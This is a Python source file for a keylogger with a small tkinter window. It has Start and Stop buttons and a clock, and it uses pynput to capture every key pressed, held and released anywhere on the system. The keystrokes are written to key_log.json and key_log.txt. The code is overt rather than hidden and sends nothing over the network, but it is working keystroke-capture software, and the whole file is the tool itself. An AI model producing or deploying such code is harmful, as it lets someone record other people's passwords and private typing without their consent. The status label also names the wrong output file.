
import tkinter as tk
from tkinter import *
from pynput import keyboard
import json
import time

keys_used = []
flag = False
keys = ""

def generate_text_log(key):
    with open('key_log.txt',"w+") as keys:
        keys.write(key)

def generate_json_file(keys_used):
    with open('key_log.json', '+wb') as key_log:
        key_list_bytes = json.dumps(keys_used).encode()
        key_log.write(key_list_bytes)
    
def on_press(key):
    global flag, keys_used, keys
    if flag == False:
        keys_used.append(
            {'Pressed':f'{key}'}
        )
        flag = True
    
    if flag == True:
        keys_used.append(
            {'Held':f'{key}'}
        )
    generate_json_file(keys_used)


def on_release(key):
    global flag, keys_used, keys
    keys_used.append(
        {'Released':f'{key}'}
    )

    if flag == True:
        flag = False
    generate_json_file(keys_used)

    keys = keys+str(key)
    generate_text_log(str(keys))

    # To start the keylogger
def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')


    # TO stop the keylogger
def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

# GUI code
root = Tk()
root.title("Keylogger") #title
root.config(bg="cyan")  #background color

label = Label(root, text='Click "Start" to begin keylogging.')
label.config(anchor=CENTER)
label.pack()

start_button = Button(root, text="Start", command=start_keylogger)
start_button.pack(side=LEFT)

stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
stop_button.pack(side=RIGHT)

root.geometry("500x300") 


# time
def ptime():
    displaytime=time.strftime("%H:%M:%S:%p")  #Time format
    clock.config(text=displaytime)
    clock.after(100,ptime)

clock=Label(root,font=("Algerian",10))  #what is to me write inside the clock
clock.pack()   #include in window

ptime()

root.mainloop()